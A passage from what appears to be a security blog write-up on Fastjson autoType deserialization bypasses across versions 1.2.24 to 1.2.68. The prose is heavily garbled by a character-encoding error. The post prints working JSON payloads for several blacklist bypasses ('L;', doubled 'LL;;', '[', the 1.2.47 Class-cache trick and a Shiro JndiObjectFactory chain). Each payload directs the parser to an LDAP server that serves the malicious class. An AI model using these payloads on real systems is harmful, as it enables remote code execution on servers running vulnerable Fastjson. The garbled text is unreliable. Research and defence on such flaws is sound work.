                        <a href="#1268expectclass" aria-label="&amp;lt;1.2.68(expectClass">&lt;1.2.68(expectClass</a><ul>
                            
                    <li>
                        <a href="#%e5%85%b7%e4%bd%93%e5%88%a9%e7%94%a8%e6%9f%a5%e6%89%be" aria-label="å…·ä½“åˆ©ç”¨æŸ¥æ‰¾">å…·ä½“åˆ©ç”¨æŸ¥æ‰¾</a></li>
                    <li>
                        <a href="#expectclass%e6%9f%a5%e6%89%be" aria-label="expectClassæŸ¥æ‰¾">expectClassæŸ¥æ‰¾</a><ul>
                            
                    <li>
                        <a href="#%e6%97%a0autotypesupport" aria-label="æ— autoTypeSupport">æ— autoTypeSupport</a></li>
                    <li>
                        <a href="#return-%e5%b0%8f%e7%bb%93" aria-label="return å°ç»“">return å°ç»“</a></li>
                    <li>
                        <a href="#%e6%80%8e%e4%b9%88%e6%89%be" aria-label="æ€ä¹ˆæ‰¾">æ€ä¹ˆæ‰¾</a></li></ul>
                    </li>
                    <li>
                        <a href="#1268%e5%b0%8f%e7%bb%93" aria-label="1.2.68å°ç»“">1.2.68å°ç»“</a></li>
                    <li>
                        <a href="#%e4%bf%ae%e5%a4%8d" aria-label="ä¿®å¤">ä¿®å¤</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#12731280" aria-label="1.2.73~1.2.80">1.2.73~1.2.80</a><ul>
                            
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86" aria-label="åˆ©ç”¨åŸç†">åˆ©ç”¨åŸç†</a></li>
                    <li>
                        <a href="#why-public-filed" aria-label="why public filed">why public filed</a></li>
                    <li>
                        <a href="#gadget" aria-label="gadget">gadget</a><ul>
                            
                    <li>
                        <a href="#jdbc" aria-label="jdbc">jdbc</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e4%bf%ae%e5%a4%8d-1" aria-label="ä¿®å¤">ä¿®å¤</a></li></ul>
                    </li>
                    <li>
                        <a href="#cve-2022-25845" aria-label="CVE-2022-25845">CVE-2022-25845</a><ul>
                            
                    <li>
                        <a href="#step1-put-javaioinputstream" aria-label="Step1: put java.io.InputStream">Step1: put java.io.InputStream</a><ul>
                            
                    <li>
                        <a href="#ref%e7%9a%84%e5%88%a9%e7%94%a8" aria-label="$refçš„åˆ©ç”¨">$refçš„åˆ©ç”¨</a></li></ul>
                    </li>
                    <li>
                        <a href="#step2%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96" aria-label="Step2ï¼šæ–‡ä»¶è¯»å–">Step2ï¼šæ–‡ä»¶è¯»å–</a><ul>
                            
                    <li>
                        <a href="#getbom" aria-label="getBom()">getBom()</a></li></ul>
                    </li>
                    <li>
                        <a href="#step3-%e5%86%99%e5%85%a5%e6%96%87%e4%bb%b6" aria-label="Step3: å†™å…¥æ–‡ä»¶">Step3: å†™å…¥æ–‡ä»¶</a></li>
                    <li>
                        <a href="#step4-%e5%8a%a0%e8%bd%bdclass" aria-label="Step4 åŠ è½½class">Step4 åŠ è½½class</a></li></ul>
                    </li></ul>
                        
                    <li>
                        <a href="#feature%e7%bb%93%e8%ae%ba" aria-label="Feature(ç»“è®º):"><strong>Feature(ç»“è®º):</strong></a><ul>
                            
                    <li>
                        <a href="#%e7%89%88%e6%9c%ac%e6%8e%a2%e6%b5%8b" aria-label="ç‰ˆæœ¬æ¢æµ‹">ç‰ˆæœ¬æ¢æµ‹</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><blockquote>
<p>åšä¸ªæ€»ç»“ï¼Œå¿˜äº†æ¡å¾—å¿«</p>
</blockquote>
<h2 id="12241247">1.2.24~1.2.47<a hidden class="anchor" aria-hidden="true" href="#12241247">#</a></h2>
<p>1.2.24-1.2.47ï¼ˆç»•è¿‡é»‘åå•çš„poc <strong>éƒ½éœ€å¼€å¯autoTypeSupport</strong> ç”¨äºè¿”å›classï¼Œå…³é—­throw</p>
<h3 id="1224">1.2.24<a hidden class="anchor" aria-hidden="true" href="#1224">#</a></h3>
<p>ä¸¤ä¸ªå¸¸ç”¨pocï¼Œæ— è¿‡æ»¤</p>
<ul>
<li>
<p><strong>TemplatesImpl ååºåˆ—åŒ–</strong></p>
</li>
<li>
<p><strong>JdbcRowSetImpl ååºåˆ—åŒ–</strong></p>
</li>
</ul>
<h3 id="12251241"><strong>1.2.25~1.2.41</strong><a hidden class="anchor" aria-hidden="true" href="#12251241">#</a></h3>
<p>å¢åŠ äº†é»‘/ç™½åå•æ£€æµ‹ï¼Œä½†æ˜¯å†æœ€å<code>loadClass()</code>æ—¶ï¼Œä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„classè¿›è¡Œ<code>L</code>å’Œ<code>;</code>çš„æˆªå–å†åŠ è½½class ï¼ˆ<code>Lxxx;</code>-&gt;<code>xxx</code>ï¼‰</p>
<p>å¯¼è‡´å¯ä»¥é€šè¿‡<code>L;</code>ç»•è¿‡å‰é¢çš„<code>é»‘åå•æ£€æµ‹</code>ï¼Œæœ€ååŠ è½½æ—¶å†æˆªå–åŠå¯ä»¥åŠ è½½æˆ‘ä»¬æƒ³è¦çš„classï¼Œä»è€Œ<code>ç»•è¿‡é»‘åå•</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//å¼€å¯autoTypeSupport</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;</span><span class="p">,</span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="1242"><strong>1.2.42</strong><a hidden class="anchor" aria-hidden="true" href="#1242">#</a></h3>
<p>åœ¨<code>checkAutoType</code>æœ€å¼€å§‹æ—¶åŠä¼šå¯¹classè¿›è¡Œä¸€æ¬¡<code>L;</code>çš„æˆªå–ï¼Œç„¶åè¿›è¡Œé»‘åå•æ£€æµ‹å†<code>loadClass()</code>ï¼Œä½†æ˜¯è¿™ä¸ªæˆªå–åªä¼šè¿›è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥åŒå†™<code>L;</code>è¿›è¡Œç»•è¿‡ï¼Œ<code>LLxxx;;</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// poc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//å¼€å¯autoTypeSupport</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;LLcom.sun.rowset.JdbcRowSetImpl;;&#34;</span><span class="p">,</span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="1243">1.2.43<a hidden class="anchor" aria-hidden="true" href="#1243">#</a></h3>
<p>åœ¨æ­¤ç‰ˆæœ¬ä¸­,<code>checkAutoType</code>å¯¹<code>LL</code>è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœç±»ä»¥<code>LL</code>å¼€å¤´ï¼Œåˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p>
<p>ä½†æ˜¯åœ¨<code>loadClass()</code>ä¸­é™¤äº†<code>L;</code>çš„æˆªå–ï¼Œä¼šæœ‰å¯¹<code>[</code>å¼€å¤´çš„æˆªå–ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨<code>[</code>è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯ç›´æ¥ç”¨ä¼šå­˜åœ¨æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™å¡«ä¸Šå¯¹åº”å­—ç¬¦<code>{</code>å³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// poc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//å¼€å¯autoTypeSupport</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;[com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="o">[</span><span class="p">{,</span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>1.2.44</strong></p>
<ul>
<li>ä¿®å¤äº†<code>[</code>çš„ç»•è¿‡ï¼Œåœ¨<code>checkAutoType</code>ä¸­è¿›è¡Œåˆ¤æ–­å¦‚æœç±»åä»¥<code>[</code>å¼€å§‹åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸</li>
</ul>
<h3 id="1247é€šæ€"><strong>&lt;1.2.47(é€šæ€!!!)</strong><a hidden class="anchor" aria-hidden="true" href="#1247é€šæ€">#</a></h3>
<p><strong>æ— éœ€å¼€å¯autoTypeSupport</strong></p>
<blockquote>
<p>ç®€è¿°ï¼šé€šè¿‡<code>Class.class</code>å¯¹åº”çš„deserializerååºåˆ—åŒ–ï¼Œå®ç°<code>æ¶æ„class</code>çš„<code>åŠ è½½</code>å’Œ<code>mapå­˜å‚¨</code>ï¼Œç„¶åå†é€šè¿‡<code>@type</code>è§¦å‘ï¼Œä»mapä¸­è·å–å­˜å‚¨çš„classå®Œæˆ<code>æ¶æ„classçš„è·å–</code>ï¼Œè¿™ä¸ªè¿‡ç¨‹å®Œå…¨é¿å…äº†<code>autoTypeçš„é»‘ç™½åå•æ£€æµ‹</code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;1&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Class&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;2&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>åˆå§‹åŒ–æ—¶ä¼šç»™<code>deserializers</code>å­˜å…¥ä¸€äº›ç±»å‹</p>
<p><img loading="lazy" src="images/image-20250527153738301.png" alt="image-20250527153738301"  />
</p>
<p>æ‰€ä¸‹é¢è¿™é‡Œä¼šæ‰¾åˆ°Class.class</p>
<p><img loading="lazy" src="images/image-20250527154119964.png" alt="image-20250527154119964"  />
</p>
<p>ç„¶åreturn classï¼Œå†å¯¹å¯¹åº”çš„<code>deserializer</code>è¿›è¡Œååºåˆ—åŒ–</p>
<p><img loading="lazy" src="images/image-20250527153949786.png" alt="image-20250527153949786"  />
</p>
<p>è€Œdeserialze()ä¸­ä¼šå¯¹<code>val</code>è®¾ç½®çš„å€¼è¿›è¡Œ<code>loadClass()</code></p>
<p><img loading="lazy" src="images/image-20250527154718471.png" alt="image-20250527154718471"  />
</p>
<p>å¹¶ä¸”åŠ è½½æˆåŠŸä¼šå°†å…¶putåˆ°<code>mappings</code>ä¸­ï¼ˆcacheé»˜è®¤å°±æ˜¯<code>true</code>ï¼‰,æ²¡é”™è¿™é‡Œ<code>mappings</code>å°±æ˜¯<code>getClassFromMapping()</code>ä¸­è·å–çš„<code>map</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å†<code>@type</code>è°ƒç”¨jdbcå³å¯ï¼ˆè¿™é‡Œå› ä¸ºæ˜¯<code>æ²¡å¼€å¯autoTypeSupport</code>ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªforé»‘ç™½åå•æ£€æµ‹ï¼Œè€Œé€šè¿‡<code>getClassFromMapping()</code>è·å–åˆ°classåï¼Œæœ‰ifåˆ¤æ–­è¿›è¡Œ<code>return class</code>ï¼Œä¸å†è¿›è¡Œåç»­ä»£ç ï¼ŒåŠå®ç°äº†æ²¡æœ‰é»‘åå•æ£€æµ‹ï¼‰</p>
<p><img loading="lazy" src="images/image-20250527155011569.png" alt="image-20250527155011569"  />
</p>
<p><img loading="lazy" src="images/image-20250527155407289.png" alt="image-20250527155407289"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getClassFromMapping</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">mappings</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">className</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="12481268">1.2.48~1.2.68<a hidden class="anchor" aria-hidden="true" href="#12481268">#</a></h2>
<p><strong>1.2.48</strong></p>
<ul>
<li>åœ¨<code>MiscCodec</code>ä¸­ä¿®æ”¹äº†<code>cache</code>çš„é»˜è®¤å€¼ï¼Œä¿®æ”¹ä¸º<code>false</code>ï¼Œå¹¶ä¸”å¯¹<code>TypeUtils.loadClass</code>ä¸­çš„<code>mapping.put</code>åšäº†é™åˆ¶</li>
</ul>
<blockquote>
<p>åœ¨æ­¤ç‰ˆæœ¬ä¸­æ–°å¢äº†ä¸€ä¸ª<code>safeMode</code>åŠŸèƒ½ï¼Œå¦‚æœå¼€å¯çš„è¯ï¼Œå°†ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå®Œå…¨æœç»äº†<code>autoTypeSupport</code>çš„ç»•è¿‡</p>
<p>è¿™é‡Œè¿˜å­˜åœ¨ä¸€äº›<strong>é»‘åå•ç»•è¿‡</strong>ï¼ˆéœ€è¦å¼€å¯autoTypeSupport</p>
<p><a href="https://www.anquanke.com/post/id/232774#h3-18">https://www.anquanke.com/post/id/232774#h3-18</a></p>
</blockquote>
<h3 id="1267åˆ†æä¸€æ¡é“¾å­">1.2.67åˆ†æä¸€æ¡é“¾å­<a hidden class="anchor" aria-hidden="true" href="#1267åˆ†æä¸€æ¡é“¾å­">#</a></h3>
<p><a href="https://www.anquanke.com/post/id/232774#h3-16">https://www.anquanke.com/post/id/232774#h3-16</a></p>
<p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong> <strong>ç»•è¿‡é»‘åå•</strong> éœ€è¦<code>å¼€å¯AutoTypeSupport</code>ï¼ˆä¸ç„¶æ²¡åœ°æ–¹åŠ è½½classï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">a67</span><span class="o">=</span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.jndi.JndiObjectFactory\&#34;,\&#34;resourceName\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;,\&#34;instance\&#34;:{\&#34;$ref\&#34;:\&#34;$.instance\&#34;}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSON</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">a67</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><blockquote>
<p>è¿™é‡Œé€šè¿‡<code>setResourceName</code>è®¾ç½®<code>jndiæ¶æ„vps</code>ï¼Œç„¶å<code>getInstance</code>è§¦å‘jndiè¯·æ±‚</p>
<p><code>&quot;instance&quot;:{}</code>è¿™é‡Œä¸èƒ½è¿™æ ·ä½¿ç”¨ï¼Œå› ä¸º<code>public T getInstance() {</code>è¿”å›å€¼ç±»å‹<code>ä¸</code>ç»§æ‰¿è‡ªCollection.class Map AtomicBoolean AtomicInteger AtomicLong è¿™é‡Œ<code>T</code>è°ƒè¯•ç±»å‹æ˜¯<code>java.lang.Object</code></p>
<p>ä½†æ˜¯å¯ä»¥é€š<code>$ref</code>æ¥è§¦å‘ï¼Œé‚£ä¹ˆçœ‹çœ‹$refæ˜¯æ€ä¹ˆå¤„ç†çš„</p>
</blockquote>
<h4 id="å¾ªç¯å¼•ç”¨-ref">å¾ªç¯å¼•ç”¨ $ref<a hidden class="anchor" aria-hidden="true" href="#å¾ªç¯å¼•ç”¨-ref">#</a></h4>
<p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>{&quot;$ref&quot;:&quot;$&quot;}</td>
<td>å¼•ç”¨æ ¹å¯¹è±¡</td>
</tr>
<tr>
<td>{&quot;$ref&quot;:&quot;@&quot;}</td>
<td>å¼•ç”¨è‡ªå·±</td>
</tr>
<tr>
<td>{&quot;$ref&quot;:&quot;..&quot;}</td>
<td>å¼•ç”¨çˆ¶å¯¹è±¡</td>
</tr>
<tr>
<td>{&quot;$ref&quot;:&quot;../..&quot;}</td>
<td>å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡</td>
</tr>
<tr>
<td>{&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;}</td>
<td>åŸºäºè·¯å¾„çš„å¼•ç”¨</td>
</tr>
</tbody>
</table>
<p>$refåœ¨ååºåˆ—åŒ–jsonæ—¶ï¼Œä¼šè¿›è¡Œä¸€äº›åˆå§‹åŒ–è®¾ç½®å€¼ï¼Œä¾¿äºåç»­è°ƒç”¨</p>
<p><img loading="lazy" src="images/image-20250527112641868.png" alt="image-20250527112641868"  />
</p>
<p>valueæ˜¯ååºåˆ—åŒ–å®Œçš„<code>å¯¹è±¡</code>ï¼Œç„¶åhandleResovleTaskè¿›è¡Œrefçš„è°ƒç”¨</p>
<p><img loading="lazy" src="images/image-20250527111208262.png" alt="image-20250527111208262"  />
</p>
<p>è°ƒç”¨å‰ï¼Œè¿˜ä¼šåˆå§‹åŒ–ä¸€äº›fieldInfoï¼Œä½¿ä¸€äº›æœ¬æ¥ä¸èƒ½è°ƒç”¨æ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯é€šè¿‡<code>computeGetters</code>åˆå§‹getteræ–¹æ³•çš„ã€‚ä½†æ˜¯è¿™é‡Œå°±<code>ä¸é™åˆ¶è¿”å›å€¼</code>äº†ï¼Œæ‰€ä»¥<code>getInstance</code>å¾—ä»¥è¢«æ·»åŠ </p>
<p>è¿™é‡Œæ»¡è¶³é•¿åº¦&gt;=4,ç¬¬å››ä½æ•°ä¸ºå¤§å†™åŸºæœ¬ä¸Šå°±å¯ä»¥æ·»åŠ åˆ°filedInfoé‡Œé¢äº†</p>
<p><img loading="lazy" src="images/image-20250527111242910.png" alt="image-20250527111242910"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="s">&#34;instance&#34;</span><span class="p">:{</span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="s">&#34;$.instance&#34;</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åå†é€šè¿‡<code>$ref</code>å»è·å–{}(æ•´ä¸ªå¯¹è±¡)ä¸‹&quot;instance&quot;ï¼Œä»è€Œè§¦å‘è·å–å¯¹è±¡çš„<code>instance</code>å±æ€§ï¼ŒåŠè°ƒç”¨fieldInfoä¸­å¯¹åº”çš„getteræ–¹æ³•ï¼Œè·å–<code>instance</code>å€¼ï¼Œè§¦å‘<code>getInstance</code>å¾—ä»¥åˆ©ç”¨</p>
<p><img loading="lazy" src="images/image-20250527113724025.png" alt="image-20250527113724025"  />
</p>
<h3 id="1268expectclass">&lt;1.2.68(expectClass<a hidden class="anchor" aria-hidden="true" href="#1268expectclass">#</a></h3>
<p>åœ¨ä¸å¼€å¯<code>autoTypeSupport</code>çš„æƒ…å†µä¸‹ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹å¯ä»¥åˆ©ç”¨expectClassï¼ŒåŠ è½½<code>æ¶æ„class</code>åæ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶å°±èƒ½<code>è¿”å›</code>class</p>
<ul>
<li>ä¼ å…¥<code>expectClass</code>ä¸ä¸ºnull</li>
<li>æ¶æ„classç»§æ‰¿<code>expectClass</code></li>
</ul>
<p><img loading="lazy" src="images/image-20250527171423759.png" alt="image-20250527171423759"  />
</p>
<p>æ­£å¸¸å³ä½¿ç»•è¿‡é»‘åå•ä¹Ÿéœ€è¦å¼€å¯autoTypeSupportï¼Œä¿è¯classçš„è¿”å›</p>
<p><img loading="lazy" src="images/image-20250527172710281.png" alt="image-20250527172710281"  />
</p>
<h4 id="å…·ä½“åˆ©ç”¨æŸ¥æ‰¾">å…·ä½“åˆ©ç”¨æŸ¥æ‰¾<a hidden class="anchor" aria-hidden="true" href="#å…·ä½“åˆ©ç”¨æŸ¥æ‰¾">#</a></h4>
<p>è€Œæ­£å¸¸è°ƒç”¨ï¼Œæˆ‘ä»¬çš„<code>expectClass</code>éƒ½æ˜¯<code>null</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾<code>checkAutoType</code>å…¶ä»–åœ°æ–¹çš„è°ƒç”¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">getFeatures</span><span class="p">());</span><span class="w">
</span></span></span></code></pre></div><p>å‘ç°æœ‰2å¤„ï¼Œä¸”éƒ½æ˜¯<code>ååºåˆ—åŒ–</code>çš„æ—¶å€™è°ƒç”¨ï¼Œåˆ†åˆ«æ˜¯<code>JavaBeanDeserializer</code>ï¼Œ<code>ThrowableDeserializer</code></p>
<p><img loading="lazy" src="images/image-20250527174517311.png" alt="image-20250527174517311"  />
</p>
<p>åŠæˆ‘ä»¬éœ€è¦å–çœ‹æ€ä¹ˆè·å–è¿™ä¸¤ä¸ª<code>serializer</code>ï¼Œé‚£å°±æ˜¯å»åˆ†æ<code>getDeserializer()</code>å‘—ï¼Œæˆ‘ä»¬çš„<code>expectClass</code>ä¸å±äºä¸Šé¢ç±»æ—¶ä¼šè¿›å…¥åˆ°<code>createJavaBeanDeserializer()</code>ï¼ŒåŒæ—¶çœ‹åˆ°ä¸Šæ–¹<code>else if</code>ï¼Œ<code>expectClass</code>ç»§æ‰¿ä¸<code>Throwable.class</code>å³å¯è¿”å›<code>ThrowableDeserializerååºåˆ—åŒ–å™¨</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">isAssignableFrom</span><span class="p">(</span><span class="n">clazz</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">derializer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ThrowableDeserializer</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">clazz</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250528094227484.png" alt="image-20250528094227484"  />
</p>
<p>å¯ä»¥çœ‹åˆ°ç»è¿‡<code>createJavaBeanDeserializer()</code>ä¸€ç³»åˆ—å¤„ç†åï¼Œå¯ä»¥è¿”å›<code>JavaBeanDeserializerååºåˆ—åŒ–å™¨</code>ï¼Œåç»­åˆ™ä¼šè°ƒç”¨</p>
<p><img loading="lazy" src="images/image-20250528094533040.png" alt="image-20250528094533040"  />
</p>
